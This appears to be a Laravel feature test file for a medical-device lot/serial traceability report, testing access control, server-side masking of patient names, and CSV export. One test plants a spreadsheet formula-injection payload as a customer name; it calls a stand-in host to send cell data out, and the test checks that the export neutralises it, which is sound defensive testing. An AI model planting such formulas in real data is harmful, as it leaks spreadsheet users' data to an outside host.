<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\BatchConsumption;
use App\Models\Customer;
use App\Models\GoodsReceipt;
use App\Models\Invoice;
use App\Models\InvoiceLine;
use App\Models\MedicalCase;
use App\Models\MedicalCaseItem;
use App\Models\Product;
use App\Models\ProductBatch;
use App\Models\ProductSerial;
use App\Models\StockMovement;
use App\Models\Tenant;
use App\Models\User;
use App\Models\Warehouse;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Modules\Inventory\Models\PurchaseOrder;
use Modules\Inventory\Models\Supplier;
use Modules\Sales\Models\DeliveryOrder;
use Modules\Sales\Models\DeliveryOrderLine;
use Modules\Sales\Models\SalesOrder;
use Modules\Sales\Models\SalesOrderLine;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Tests\TenantTestCase;

/**
 * Issue #583 [SALES-ODOO] — lot/serial traceability report: enter a lot or
 * serial and see every move upstream (supplier receipt) and downstream
 * (stock moves → delivery order → hospital → medical case → invoice), with
 * patient names masked server-side unless the caller holds
 * medical_cases.phi.view (#567), and exportable for regulatory recalls.
 *
 * These are router-level tests: router → middleware → controller.
 * RED evidence: the route does not exist yet, so every test below 404s.
 */
class Issue583LotSerialTraceabilityReportTest extends TenantTestCase
{
    private const PHI_PERMISSION = 'medical_cases.phi.view';

    private string $tenantId;

    private User $phiUser;

    private User $maskedUser;

    private User $salesUser;

    private Customer $customer;

    private Product $product;

    private Warehouse $warehouse;

    private Supplier $supplier;

    private ProductBatch $batch;

    private GoodsReceipt $grn;

    private DeliveryOrderLine $doLine;

    private DeliveryOrder $deliveryOrder;

    private MedicalCase $case;

    private Invoice $invoice;

    private InvoiceLine $invoiceLine;

    protected function setUp(): void
    {
        parent::setUp();

        $this->tenantId = (string) Str::uuid();
        $this->bindTenantContext($this->tenantId);

        $this->seed(\Database\Seeders\RolePermissionSeeder::class);
        foreach (['Manager', 'Viewer', 'Sales'] as $role) {
            Role::firstOrCreate(['name' => $role, 'guard_name' => 'web']);
        }

        Tenant::withoutEvents(fn () => Tenant::create([
            'id' => $this->tenantId,
            'name' => 'Traceability Tenant',
            'email' => fake()->unique()->safeEmail(),
            'plan' => 'standard',
        ]));

        // Manager holds reports.view AND medical_cases.phi.view.
        $this->phiUser = User::factory()->create();
        $this->phiUser->assignRole('Manager');

        // Viewer holds reports.view; the PHI grant is revoked for this test
        // (runtime role edit, NOT a seeder change) so the non-PHI path is
        // exercised through the real permission resolver.
        $this->maskedUser = User::factory()->create();
        $this->maskedUser->assignRole('Viewer');
        Permission::findByName(self::PHI_PERMISSION, 'web');
        Role::findByName('Viewer', 'web')->revokePermissionTo(self::PHI_PERMISSION);

        // A sales-facing user with no reports.view must not reach the report.
        $this->salesUser = User::factory()->create();
        $this->salesUser->assignRole('Sales');

        foreach ([
            ['user' => $this->phiUser, 'role' => 'manager'],
            ['user' => $this->maskedUser, 'role' => 'viewer'],
            ['user' => $this->salesUser, 'role' => 'sales'],
        ] as $entry) {
            DB::table('user_company_access')->insert([
                'user_id' => $entry['user']->id,
                'tenant_id' => $this->tenantId,
                'role' => $entry['role'],
                'is_default' => true,
                'created_at' => now(),
                'updated_at' => now(),
            ]);
        }

        $this->seedTraceableLot();
    }

    // ─────────────────────────────────────────────────────────────────────
    // Fixture: one lot received from a supplier, sold on a DO to a hospital,
    // consumed by a medical case for a patient, and invoiced.
    // ─────────────────────────────────────────────────────────────────────

    private function seedTraceableLot(): void
    {
        $this->supplier = Supplier::create([
            'name' => 'Traceable Supplier Pte Ltd',
            'code' => 'SUP-583',
            'is_active' => true,
        ]);

        $this->customer = Customer::factory()->create([
            'name' => 'Traceable General Hospital',
        ]);

        $this->warehouse = Warehouse::create([
            'name' => 'Traceability Warehouse',
            'code' => 'TW-'.uniqid(),
            'is_active' => true,
            'is_default' => true,
        ]);

        $this->product = Product::factory()->create([
            'name' => 'Traceability Implant',
            'sku' => 'TRACE-583',
            'track_inventory' => true,
            'tracking_method' => Product::TRACKING_BATCH,
            'cost' => 250.00,
            'price' => 500,
            'stock_quantity' => 10,
        ]);

        $po = PurchaseOrder::create([
            'po_number' => 'PO-583-0001',
            'supplier_id' => $this->supplier->id,
            'warehouse_id' => $this->warehouse->id,
            'status' => 'received',
            'order_date' => now()->subDays(45)->toDateString(),
            'created_by' => $this->phiUser->id,
        ]);

        $this->grn = GoodsReceipt::create([
            'grn_number' => 'GRN-583-0001',
            'purchase_order_id' => $po->id,
            'warehouse_id' => $this->warehouse->id,
            'received_by' => $this->phiUser->id,
            'received_date' => now()->subDays(40)->toDateString(),
            'status' => 'confirmed',
        ]);

        $this->batch = ProductBatch::create([
            'product_id' => $this->product->id,
            'warehouse_id' => $this->warehouse->id,
            'batch_number' => 'LOT-583-A',
            'lot_number' => 'LOT-583-A',
            'supplier_batch_number' => 'SUP-BATCH-77',
            'supplier_id' => $this->supplier->id,
            'quantity' => 4,
            'quantity_reserved' => 0,
            'cost' => 250.00,
            'expiry_date' => now()->addYear()->toDateString(),
            'received_date' => now()->subDays(40)->toDateString(),
            'status' => ProductBatch::STATUS_AVAILABLE,
        ]);

        // Supplier receipt stock movement (the movement carries the lot).
        $receiptMovement = StockMovement::create([
            'product_id' => $this->product->id,
            'warehouse_id' => $this->warehouse->id,
            'type' => 'purchase',
            'quantity' => 10,
            'old_quantity' => 0,
            'balance_after' => 10,
            'reference' => $this->grn->grn_number,
            'reference_type' => 'GoodsReceipt',
            'reference_id' => $this->grn->id,
            'batch_number' => $this->batch->lot_number,
            'created_by' => $this->phiUser->id,
        ]);
        $receiptMovement->created_at = now()->subDays(40);
        $receiptMovement->save();

        // Downstream: delivery order + line carrying the lot.
        $this->deliveryOrder = DeliveryOrder::create([
            'delivery_order_number' => 'DO-583-0001',
            'customer_id' => $this->customer->id,
            'warehouse_id' => $this->warehouse->id,
            'status' => 'done',
            'completed_at' => now()->subDays(20),
            'created_by' => $this->phiUser->id,
        ]);

        $salesOrder = SalesOrder::create([
            'sales_order_number' => 'SO-583-0001',
            'customer_id' => $this->customer->id,
            'created_by' => $this->phiUser->id,
        ]);

        $salesOrderLine = SalesOrderLine::create([
            'sales_order_id' => $salesOrder->id,
            'description' => 'Traceability implant line',
            'product_id' => $this->product->id,
        ]);

        $this->doLine = DeliveryOrderLine::create([
            'delivery_order_id' => $this->deliveryOrder->id,
            'sales_order_line_id' => $salesOrderLine->id,
            'line_type' => 'product',
            'product_id' => $this->product->id,
            'product_batch_id' => $this->batch->id,
            'batch_number' => $this->batch->batch_number,
            'lot_number' => $this->batch->lot_number,
            'quantity_ordered' => 1,
            'quantity_delivered' => 1,
            'unit_price' => 500,
            'patient_name' => 'Jane Doe',
        ]);

        // Stock issue for the delivery, plus the consumption ledger link that
        // #131 records for every sale.
        $issueMovement = StockMovement::create([
            'product_id' => $this->product->id,
            'warehouse_id' => $this->warehouse->id,
            'type' => 'sale',
            'quantity' => 1,
            'old_quantity' => 10,
            'balance_after' => 9,
            'reference' => $this->deliveryOrder->delivery_order_number,
            'reference_type' => 'DeliveryOrder',
            'reference_id' => $this->deliveryOrder->id,
            'batch_number' => $this->batch->lot_number,
            'created_by' => $this->phiUser->id,
        ]);
        $issueMovement->created_at = now()->subDays(20);
        $issueMovement->save();

        BatchConsumption::create([
            'stock_movement_id' => $issueMovement->id,
            'batch_id' => $this->batch->id,
            'product_id' => $this->product->id,
            'warehouse_id' => $this->warehouse->id,
            'quantity' => 1,
            'unit_cost' => 250.00,
            'reference_type' => 'DeliveryOrder',
            'reference_id' => $this->deliveryOrder->id,
        ]);

        // Medical case for a patient, linked to the delivered DO line.
        $this->case = MedicalCase::create([
            'customer_id' => $this->customer->id,
            'status' => 'delivered',
            'case_date' => now()->subDays(19)->toDateString(),
            'patient_reference' => 'MRN-583',
            'patient_name_encrypted' => 'Jane Doe',
            'created_by' => $this->phiUser->id,
        ]);

        MedicalCaseItem::create([
            'medical_case_id' => $this->case->id,
            'sales_order_item_id' => $salesOrderLine->id,
            'delivery_order_item_id' => $this->doLine->id,
            'product_id' => $this->product->id,
            'allocated_qty' => 1,
            'delivered_qty' => 1,
            'unit_price' => 500,
        ]);

        // Invoice for the lot, linked to the DO and the medical case.
        $this->invoice = Invoice::factory()->create([
            'invoice_number' => 'INV-583-0001',
            'customer_id' => $this->customer->id,
            'invoice_date' => now()->subDays(18)->toDateString(),
            'status' => 'posted',
            'lifecycle_status' => 'posted',
            'created_by' => $this->phiUser->id,
        ]);

        $this->invoiceLine = InvoiceLine::create([
            'invoice_id' => $this->invoice->id,
            'product_id' => $this->product->id,
            'product_batch_id' => $this->batch->id,
            'lot_number' => $this->batch->lot_number,
            'description' => 'Traceability implant',
            'quantity' => 1,
            'unit_price' => 500,
            'tax_rate' => 0,
        ]);

        DB::table('invoice_delivery_orders')->insert([
            'invoice_id' => $this->invoice->id,
            'delivery_order_id' => $this->deliveryOrder->id,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $this->case->update(['invoice_id' => $this->invoice->id]);
    }

    // ─────────────────────────────────────────────────────────────────────
    // Helpers
    // ─────────────────────────────────────────────────────────────────────

    private function lotReport(User $user, array $extra = []): \Illuminate\Testing\TestResponse
    {
        return $this->actingAs($user)->getJson(
            '/api/v1/reports/traceability?'.http_build_query(array_merge([
                'lot_number' => $this->batch->lot_number,
            ], $extra))
        );
    }

    /** @return array<int, array<string, mixed>> */
    private function timeline(\Illuminate\Testing\TestResponse $response): array
    {
        $timeline = $response->json('data.timeline');

        $this->assertIsArray($timeline, 'The report must return data.timeline');

        return $timeline;
    }

    /** @return string[] */
    private function segments(array $timeline): array
    {
        return array_values(array_unique(array_map(fn ($event) => $event['segment'], $timeline)));
    }

    // ═════════════════════════════════════════════════════════════════════
    // Access control
    // ═════════════════════════════════════════════════════════════════════

    public function test_lot_traceability_requires_the_reports_view_permission(): void
    {
        $response = $this->lotReport($this->salesUser);

        $response->assertStatus(403);
        $response->assertJsonPath('required_permission', 'reports.view');
    }

    // ═════════════════════════════════════════════════════════════════════
    // The full ordered timeline (lot)
    // ═════════════════════════════════════════════════════════════════════

    public function test_lot_report_returns_the_ordered_upstream_to_invoice_timeline_with_patient_masked(): void
    {
        $response = $this->lotReport($this->maskedUser);

        $response->assertOk();

        $this->assertTrue($response->json('data.phi_masked'), 'The report must flag that PHI is masked');

        $timeline = $this->timeline($response);
        $segments = $this->segments($timeline);

        foreach (['supplier_receipt', 'stock_move', 'delivery', 'medical_case', 'invoice'] as $segment) {
            $this->assertContains($segment, $segments, "The timeline must include the {$segment} segment");
        }

        // Supplier receipt → delivery → case → invoice, in date order.
        $dates = array_map(fn ($event) => $event['occurred_at'], $timeline);
        $sorted = $dates;
        sort($sorted);
        $this->assertSame($sorted, $dates, 'The timeline must be ordered by occurrence');

        $receiptIndex = collect($timeline)->search(fn ($event) => ($event['reference'] ?? null) === $this->grn->grn_number);
        $invoiceIndex = collect($timeline)->search(fn ($event) => $event['segment'] === 'invoice');
        $this->assertIsInt($receiptIndex, 'The supplier goods receipt must be on the timeline');
        $this->assertLessThan($invoiceIndex, $receiptIndex, 'The supplier receipt must precede the invoice');

        // Upstream source is surfaced.
        $receipt = $timeline[$receiptIndex];
        $this->assertSame('GRN-583-0001', $receipt['reference']);
        $this->assertStringContainsString($this->supplier->name, json_encode($receipt['details']));
        $this->assertStringContainsString($this->product->sku, json_encode($receipt['details']));

        // Downstream documents are surfaced.
        $flat = json_encode($timeline);
        $this->assertStringContainsString($this->deliveryOrder->delivery_order_number, $flat);
        $this->assertStringContainsString($this->customer->name, $flat);
        $this->assertStringContainsString($this->case->case_no, $flat);
        $this->assertStringContainsString($this->invoice->invoice_number, $flat);

        // PHI is masked server-side for a user without medical_cases.phi.view.
        $this->assertStringNotContainsString('Jane Doe', $response->getContent());
        $this->assertStringContainsString('J******e', $response->getContent());
        $this->assertStringNotContainsString('MRN-583', $response->getContent(), 'Patient references are PHI too');
    }

    public function test_lot_report_shows_patient_names_to_a_phi_permission_holder(): void
    {
        $response = $this->lotReport($this->phiUser);

        $response->assertOk();
        $this->assertFalse($response->json('data.phi_masked'));
        $this->assertStringContainsString('Jane Doe', $response->getContent());
        $this->assertStringContainsString('MRN-583', $response->getContent());
    }

    // ═════════════════════════════════════════════════════════════════════
    // CSV export for recall — PHI masking and #898 formula neutralisation
    // ═════════════════════════════════════════════════════════════════════

    public function test_traceability_csv_export_contains_the_timeline_and_masks_patient_names(): void
    {
        $response = $this->actingAs($this->maskedUser)->get(
            '/api/v1/reports/traceability/export?'.http_build_query([
                'lot_number' => $this->batch->lot_number,
            ])
        );

        $response->assertOk();
        $response->assertHeader('content-type', 'text/csv; charset=UTF-8');

        $csv = $this->downloadedContents($response);

        $this->assertStringContainsString('LOT-583-A', $csv);
        $this->assertStringContainsString($this->case->case_no, $csv);
        $this->assertStringContainsString($this->invoice->invoice_number, $csv);
        $this->assertStringNotContainsString('Jane Doe', $csv);
        $this->assertStringContainsString('J******e', $csv);
    }

    public function test_traceability_csv_export_neutralises_formula_injection(): void
    {
        $payload = '=HYPERLINK("http://evil.example/collect?x="&A1,"Click me")';
        $this->customer->update(['name' => $payload]);

        $response = $this->actingAs($this->phiUser)->get(
            '/api/v1/reports/traceability/export?'.http_build_query([
                'lot_number' => $this->batch->lot_number,
            ])
        );

        $response->assertOk();

        $rows = array_map('str_getcsv', array_values(array_filter(
            explode("\n", trim($this->downloadedContents($response)))
        )));

        $header = $rows[0];
        $customerColumn = array_search('Customer', $header, true);
        $this->assertNotFalse($customerColumn, 'The export must carry a Customer column');

        $found = false;
        foreach (array_slice($rows, 1) as $row) {
            if (($row[$customerColumn] ?? '') === $payload) {
                $this->fail('The CSV export must neutralise formula-triggering values (#898)');
            }
            if (str_starts_with((string) ($row[$customerColumn] ?? ''), "'=")) {
                $found = true;
                $this->assertSame("'".$payload, $row[$customerColumn]);
            }
        }

        $this->assertTrue($found, 'The invoice row must carry the neutralised customer value');
    }

    // ═════════════════════════════════════════════════════════════════════
    // Serial traceability
    // ═════════════════════════════════════════════════════════════════════

    public function test_serial_report_traces_the_serial_from_receipt_to_customer_and_case(): void
    {
        $serial = ProductSerial::create([
            'product_id' => $this->product->id,
            'warehouse_id' => $this->warehouse->id,
            'batch_id' => $this->batch->id,
            'serial_number' => 'SN-583-0001',
            'status' => ProductSerial::STATUS_SOLD,
            'customer_id' => $this->customer->id,
            'sold_at' => now()->subDays(20),
            'sale_reference' => $this->deliveryOrder->delivery_order_number,
            'supplier_id' => $this->supplier->id,
            'cost' => 250.00,
        ]);

        $this->doLine->update(['product_serial_id' => $serial->id, 'serial_number' => $serial->serial_number]);
        $this->invoiceLine->update(['product_serial_id' => $serial->id, 'serial_number' => $serial->serial_number]);

        $response = $this->actingAs($this->maskedUser)->getJson(
            '/api/v1/reports/traceability?'.http_build_query([
                'serial_number' => $serial->serial_number,
            ])
        );

        $response->assertOk();

        $timeline = $this->timeline($response);
        $flat = json_encode($timeline);

        $this->assertSame('serial', $response->json('data.query.type'));
        $this->assertStringContainsString('SN-583-0001', $flat);
        $this->assertStringContainsString($this->deliveryOrder->delivery_order_number, $flat);
        $this->assertStringContainsString($this->invoice->invoice_number, $flat);
        $this->assertStringContainsString($this->case->case_no, $flat);
        $this->assertStringContainsString($this->customer->name, $flat);
    }

    public function test_report_requires_exactly_one_lot_or_serial_identifier(): void
    {
        $this->actingAs($this->maskedUser)
            ->getJson('/api/v1/reports/traceability')
            ->assertStatus(422);
    }

    private function downloadedContents($response): string
    {
        return (string) $response->streamedContent();
    }
}
